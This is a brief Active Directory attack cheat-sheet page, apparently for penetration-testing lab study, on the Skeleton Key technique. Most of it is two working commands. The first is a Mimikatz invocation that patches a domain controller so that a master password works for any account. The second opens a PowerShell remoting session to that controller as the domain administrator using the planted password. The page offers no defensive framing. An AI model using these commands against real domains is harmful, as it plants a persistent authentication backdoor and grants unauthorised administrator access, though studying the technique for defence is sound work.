---
layout: page
title: "# Skeleton Key Attack"
permalink: /ad_cheatsheets/skeleton_key_attack
---

# Skeleton Key Attack

## Load Skeleton Key

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

```powershell
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local-Credential dcorp\administrator (password:mimikatz)
```

## Resources

[Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest](https://adsecurity.org/?p=1275)

[Skeleton Key](https://book.hacktricks.xyz/windows/active-directory-methodology/skeleton-key)
